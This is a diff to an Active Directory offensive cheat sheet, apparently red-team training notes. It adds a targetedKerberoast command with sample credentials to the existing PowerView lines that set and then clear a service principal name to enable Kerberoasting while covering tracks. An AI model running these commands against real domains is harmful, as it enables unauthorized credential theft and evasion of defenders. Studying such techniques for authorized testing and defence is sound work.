@@ -281,10 +281,16 @@ Add-DomainGroupMember -Identity studentadmins -Members studentuser
 This technique will update `ServicePrincipalName` of a user object. Make sure to have a write permission on the user's attributes.
 ```
 # Set SPN
+## Windows
 Set-DomainObject -Identity sqlsvc -Set @{serviceprincipalname='my/sqlspn'}
 
 # Clear SPN (OPSEC)
 Set-DomainObject -Identity sqlsvc -Clear serviceprincipalname
+```
+
+There is also a repo [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) to automatically discover ACLs from the current user context against other domain objects looking for _Write_ permission on `servicePrincipalName` attribute. 
+```
+python3 targetedKerberoast.py -u jsparrow -p Password123 -d range.net --dc-ip 10.10.10.10
 ```
 
 ### Overwrite Logon Script
